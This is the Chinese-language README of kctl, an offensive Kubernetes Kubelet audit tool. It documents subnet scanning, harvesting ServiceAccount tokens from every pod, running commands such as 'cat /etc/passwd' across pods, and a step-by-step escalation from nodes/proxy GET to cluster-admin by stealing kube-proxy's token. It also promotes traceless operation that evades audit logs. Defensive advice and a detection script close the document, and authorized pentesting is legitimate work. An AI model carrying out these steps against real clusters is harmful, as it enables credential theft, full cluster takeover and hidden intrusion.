<p align="center">
  <img src="https://img.shields.io/github/v/release/kinopio1101/kctl?color=%2300ADD8&label=release&logo=github&logoColor=white" alt="GitHub Release">
  <img src="https://img.shields.io/badge/Go-1.24+-00ADD8?logo=go&logoColor=white" alt="Go Version">
  <a href="https://github.com/kinopio1101/kctl/blob/main/LICENSE">
    <img src="https://img.shields.io/badge/License-MIT-E11311.svg" alt="MIT License">
  </a>
  <a href="https://github.com/kinopio1101/kctl/issues">
    <img src="https://img.shields.io/github/issues/kinopio1101/kctl?color=%23F97316&logo=github" alt="GitHub Issues">
  </a>
  <a href="https://github.com/kinopio1101/kctl/stargazers">
    <img src="https://img.shields.io/github/stars/kinopio1101/kctl?color=%23FBBF24&logo=github" alt="GitHub Stars">
  </a>
</p>

<p align="center">
  <a href="./README.md"><img alt="README in English" src="https://img.shields.io/badge/English-d9d9d9"></a>
  <a href="./README.zh-CN.md"><img alt="简体中文版自述文件" src="https://img.shields.io/badge/简体中文-d9d9d9"></a>
</p>

<h1 align="center">kctl</h1>

<h4 align="center">Kubernetes Kubelet Security Audit Tool - 专用于 Kubelet 节点的安全审计与渗透测试</h4>

<p align="center">
  <a href="#功能概览">功能概览</a> •
  <a href="#快速开始">快速开始</a> •
  <a href="#控制台命令">命令</a> •
  <a href="#实战案例nodes-proxy-权限提权">攻击案例</a> •
  <a href="#防御建议">防御</a>
</p>

---

## 功能概览

kctl 是一个轻量级的 Kubernetes 安全审计工具，专门针对 Kubelet API 进行安全评估和权限分析。设计用于渗透测试场景，支持在 Pod 内运行时自动检测环境并进行横向移动。

### 核心特性

- **网段扫描**：扫描网段发现 Kubelet 节点
- **SA 权限分析**：扫描所有 Pod 的 ServiceAccount Token 权限
- **风险评估**：自动识别高危权限（cluster-admin、nodes/proxy 等）
- **横向移动**：利用 Kubelet API 在 Pod 间执行命令
- **无痕操作**：所有数据缓存在内存中，退出时自动清除

## 快速开始

### 基本使用

```bash
# 进入交互式控制台
./kctl console

# 指定目标进入
./kctl console -t 10.0.0.1

# 完整连接参数
./kctl console -t 10.0.0.1 -p 10250 --token "eyJ..." --api-server 10.0.0.1 --api-port 6443

# 使用代理
./kctl console -t 10.0.0.1 --proxy socks5://127.0.0.1:1080
```

## 交互式控制台

进入控制台后会自动：
1. 检测 Kubelet IP（默认网关）
2. 读取 ServiceAccount Token
3. 连接到 Kubelet
4. 检查当前 SA 的权限

```
$ ./kctl console

    ██╗  ██╗ ██████╗████████╗██╗
    ██║ ██╔╝██╔════╝╚══██╔══╝██║
    █████╔╝ ██║        ██║   ██║
    ██╔═██╗ ██║        ██║   ██║
    ██║  ██╗╚██████╗   ██║   ███████╗
    ╚═╝  ╚═╝ ╚═════╝   ╚═╝   ╚══════╝
                Kubelet Security Audit Tool

  Mode        : In-Pod (Memory Database)
  Kubelet     : 10.244.1.1:10250 (auto-detected)
  Token       : /var/run/secrets/kubernetes.io/serviceaccount/token

[*] Auto-connecting to Kubelet 10.244.1.1:10250...
✓ Connected successfully
[+] Using ServiceAccount: default/attacker
[*] Checking permissions...
[+] Risk Level: CRITICAL

kctl [default/attacker CRITICAL]>
```

### 控制台命令

| 命令 | 说明 |
|------|------|
| `help` | 显示帮助信息 |
| `discover <target>` | 扫描网段发现 Kubelet 节点 |
| `connect [ip]` | 连接到 Kubelet（可选，命令会自动连接） |
| `sa` | ServiceAccount 相关操作 |
| `sa list` | 列出已扫描的 SA |
| `sa scan` | 扫描所有 Pod 的 SA 权限 |
| `sa use <ns/name>` | 切换到指定的 SA |
| `sa info` | 显示当前 SA 详情 |
| `pods` | 列出节点上的 Pod |
| `exec` | 在 Pod 中执行命令（WebSocket） |
| `run` | 在 Pod 中执行命令（/run API） |
| `portforward` | 端口转发到 Pod |
| `pid2pod` | 将 PID 映射到 Pod（仅 Pod 内） |
| `set <key> <value>` | 设置配置项 |
| `show options` | 显示当前配置 |
| `show status` | 显示会话状态 |
| `show kubelets` | 显示发现的 Kubelet 节点 |
| `export json/csv` | 导出扫描结果 |
| `clear` | 清除缓存 |
| `exit` | 退出控制台 |

### discover 命令 - 网段扫描

扫描网段发现 Kubelet 节点：

```bash
# 扫描 CIDR 网段
discover 10.0.0.0/24

# 扫描 IP 范围
discover 10.0.0.1-254

# 指定端口和并发数
discover 10.0.0.0/24 -p 10250,10255 -c 200

# 显示所有开放端口（不仅是 Kubelet）
discover 10.0.0.0/24 --all
```

输出示例：
```
[*] Scanning 10.0.0.0/24:10250 (254 targets, 100 concurrent)
[========================================] 100% (254/254)
[*] Validating Kubelet endpoints...

+-------------+-------+------------+
| IP          | PORT  | HEALTH     |
+-------------+-------+------------+
| 10.0.0.1    | 10250 | /healthz   |
| 10.0.0.5    | 10250 | /healthz   |
+-------------+-------+------------+

[+] Scan complete in 3.2s: 3 open ports, 2 Kubelet nodes
[*] Use 'set target <ip>' to select target
[*] Use 'show kubelets' to view cached results
```

### sa 命令 - ServiceAccount 操作

```bash
# 列出所有 SA（默认）
sa

# 列出有风险的 SA
sa list --risky

# 只显示 cluster-admin
sa list --admin

# 扫描所有 Pod 的 SA Token
sa scan

# 扫描并只显示有风险的
sa scan --risky

# 选择 SA
sa use kube-system/cluster-admin

# 显示当前 SA 详情
sa info
```

### exec 命令 - 命令执行

通过 Kubelet API 在 Pod 中执行命令：

```bash
# 交互式 shell（WebSocket）
exec -it nginx-pod

# 在指定 Pod 执行命令
exec nginx-pod -- cat /etc/passwd

# 在所有 Pod 中执行
exec --all-pods -- whoami

# 排除指定命名空间
exec --all-pods --filter-ns kube-system -- id

# 使用 /run API（更简单，无需 WebSocket）
run nginx-pod --cmd "cat /etc/passwd"

# 在所有 Pod 中执行
run --all-pods --cmd "hostname"
```

### portforward 命令 - 端口转发

通过 Kubelet API 进行端口转发：

```bash
# 将本地 8080 端口转发到 Pod 的 80 端口
portforward nginx-pod 8080:80

# 指定监听地址
portforward nginx-pod 8080:80 --address 0.0.0.0

# 停止端口转发
pf stop
```

### pid2pod 命令 - PID 映射（仅 Pod 内）

将 Linux 进程 ID 映射到 Kubernetes Pod 元数据：

```bash
# 显示所有容器进程及其 Pod 信息
pid2pod

# 查看指定 PID
pid2pod --pid 1234

# 显示所有进程（包括非容器进程）
pid2pod --all
```

### 典型工作流程

```bash
# 1. 扫描网段发现 Kubelet 节点
kctl [default]> discover 10.0.0.0/24

# 2. 选择目标
kctl [default]> set target 10.0.0.5

# 3. 扫描节点上所有 Pod 的 SA 权限
kctl [default]> sa scan

# 4. 查看高权限 SA
kctl [default]> sa list --admin

# 5. 切换到高权限 SA
kctl [default]> sa use kube-system/cluster-admin

# 6. 查看新身份的权限
kctl [kube-system/cluster-admin ADMIN]> sa info

# 7. 使用新身份执行命令
kctl [kube-system/cluster-admin ADMIN]> exec -it
```

## 实战案例：nodes/proxy 权限提权

### 背景

`nodes/proxy GET` 权限是一个常见但危险的权限，许多监控工具（如 Prometheus、Datadog、Grafana）都需要此权限来收集指标。

根据 [Graham Helton 的研究](https://grahamhelton.com/blog/nodes-proxy-rce)，由于 Kubelet 在处理 WebSocket 连接时的授权缺陷，`nodes/proxy GET` 权限实际上可以用于在任意 Pod 中执行命令。

### 漏洞原理

1. WebSocket 协议要求使用 HTTP GET 进行初始握手
2. Kubelet 基于初始 HTTP 方法（GET）进行授权检查
3. 授权通过后，WebSocket 连接可以访问 `/exec` 端点执行命令
4. 这绕过了本应需要的 `nodes/proxy CREATE` 权限

### 使用 kctl 进行提权

#### 场景设置

假设你已经获得了一个 Pod 的访问权限，该 Pod 的 ServiceAccount 具有 `nodes/proxy GET` 权限：

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: nodes-proxy-reader
rules:
  - apiGroups: [""]
    resources: ["nodes/proxy"]
    verbs: ["get"]
```

#### 步骤 1：进入控制台并检查权限

```bash
# 将 kctl 复制到目标 Pod
kubectl cp kctl-linux-amd64 attacker:/kctl

# 进入 Pod
kubectl exec -it attacker -- /bin/sh

# 运行 kctl
/kctl console
```

```
[*] Auto-connecting to Kubelet 10.244.1.1:10250...
✓ Connected successfully
[+] Using ServiceAccount: default/attacker
[*] Checking permissions...
[+] Risk Level: HIGH

kctl [default/attacker HIGH]>
```

#### 步骤 2：查看当前权限

```
kctl [default/attacker HIGH]> sa info

  ServiceAccount Information
  ─────────────────────────────────────────
  Name            : attacker
  Namespace       : default
  Risk Level      : HIGH
  Token Status    : Valid

  Permissions:
    - nodes/proxy:get        <- 关键权限！
    - nodes:list
    - pods:list
```

#### 步骤 3：扫描节点上的所有 Pod

```
kctl [default/attacker HIGH]> sa scan

[*] Scanning ServiceAccount tokens...
[*] Found 15 pods with SA tokens
[*] Checking permissions... (3 concurrent)

RISK     NAMESPACE      POD                    SERVICE ACCOUNT      TOKEN    FLAGS
─────────────────────────────────────────────────────────────────────────────────
ADMIN    kube-system    kube-proxy-xxxxx       kube-proxy           Valid    -
ADMIN    kube-system    coredns-xxxxx          coredns              Valid    -
HIGH     monitoring     prometheus-xxxxx       prometheus           Valid    -
...

[+] Scan complete: 15 SAs, 2 ADMIN, 1 CRITICAL, 3 HIGH
```

#### 步骤 4：利用 nodes/proxy 执行命令

由于我们有 `nodes/proxy GET` 权限，可以直接通过 Kubelet API 在任意 Pod 中执行命令：

```
kctl [default/attacker HIGH]> pods

NAMESPACE      POD                         STATUS    CONTAINERS
───────────────────────────────────────────────────────────────
kube-system    etcd-master                 Running   etcd
kube-system    kube-apiserver-master       Running   kube-apiserver
kube-system    kube-proxy-xxxxx            Running   kube-proxy
default        nginx                       Running   nginx
...
```

```
kctl [default/attacker HIGH]> exec -n kube-system kube-proxy-xxxxx -- cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

这会返回 `kube-proxy` 的 ServiceAccount Token，该 Token 通常具有 cluster-admin 权限！

#### 步骤 5：切换到高权限身份

```
kctl [default/attacker HIGH]> sa use kube-system/kube-proxy

[+] Switched to kube-system/kube-proxy
[*] Checking permissions...
[!] Risk Level: ADMIN (cluster-admin)

kctl [kube-system/kube-proxy ADMIN]>
```

#### 步骤 6：完全控制集群

现在你拥有了 cluster-admin 权限，可以使用该 token 对集群进行完全控制。

### 攻击流程图

```
┌─────────────────────────────────────────────────────────────────┐
│                    nodes/proxy GET 提权流程                      │
└─────────────────────────────────────────────────────────────────┘

┌──────────────┐     ┌──────────────┐     ┌──────────────────────┐
│  初始访问     │     │  权限发现     │     │  横向移动            │
│              │     │              │     │                      │
│ 获得 Pod     │────>│ 发现有       │────>│ 通过 Kubelet API     │
│ 访问权限     │     │ nodes/proxy  │     │ 在其他 Pod 执行命令   │
│              │     │ GET 权限     │     │                      │
└──────────────┘     └──────────────┘     └──────────────────────┘
                                                    │
                                                    v
┌──────────────┐     ┌──────────────┐     ┌──────────────────────┐
│  完全控制     │     │  权限提升     │     │  Token 窃取          │
│              │     │              │     │                      │
│ cluster-admin│<────│ 使用高权限   │<────│ 读取系统 Pod 的      │
│ 权限         │     │ SA Token     │     │ SA Token             │
│              │     │              │     │                      │
└──────────────┘     └──────────────┘     └──────────────────────┘
```

### 防御建议

1. **避免授予 nodes/proxy 权限** - 使用 KEP-2862 提供的细粒度权限（如 `nodes/metrics`、`nodes/stats`）
2. **网络隔离** - 限制对 Kubelet 端口（10250）的访问
3. **审计日志** - 注意：直接访问 Kubelet API 不会生成 pods/exec 审计日志
4. **最小权限原则** - 定期审查 ServiceAccount 权限

### 检测脚本

检查集群中是否存在具有 `nodes/proxy` 权限的 ServiceAccount：

```bash
# 检查所有 ClusterRoleBindings
kubectl get clusterrolebindings -o json | jq -r '
  .items[] | 
  select(.roleRef.kind == "ClusterRole") |
  .metadata.name as $binding |
  .roleRef.name as $role |
  .subjects[]? |
  "\($binding) -> \($role) -> \(.kind)/\(.namespace)/\(.name)"
' | while read line; do
  role=$(echo $line | cut -d'>' -f2 | tr -d ' ')
  kubectl get clusterrole $role -o json 2>/dev/null | \
    jq -e '.rules[] | select(.resources[] | contains("nodes/proxy"))' >/dev/null && \
    echo "[!] $line"
done
```

## 风险等级说明

| 等级 | 说明 | 示例权限 |
|------|------|----------|
| ADMIN | 集群管理员 | `*/*`、cluster-admin |
| CRITICAL | 可直接提权 | `secrets:create`、`pods/exec:create` |
| HIGH | 可泄露敏感信息 | `secrets:get`、`nodes/proxy:get` |
| MEDIUM | 可能被滥用 | `pods:create`、`configmaps:get` |
| LOW | 低风险 | `pods:list`、`services:get` |
| NONE | 无风险 | 只读基础权限 |

## 注意事项

- 本工具仅用于合法的安全评估和渗透测试
- 使用前请确保已获得适当的授权
- 所有操作都在内存中进行，退出后不留痕迹
- 直接访问 Kubelet API 的操作不会被 Kubernetes 审计日志记录

## 参考资料

- [Kubernetes Remote Code Execution Via Nodes/Proxy GET Permission](https://grahamhelton.com/blog/nodes-proxy-rce)
- [KEP-2862: Fine-Grained Kubelet API Authorization](https://github.com/kubernetes/enhancements/blob/master/keps/sig-node/2862-fine-grained-kubelet-authz/README.md)
- [Kubelet Authentication/Authorization](https://kubernetes.io/docs/reference/access-authn-authz/kubelet-authn-authz/)

## 许可证

MIT License
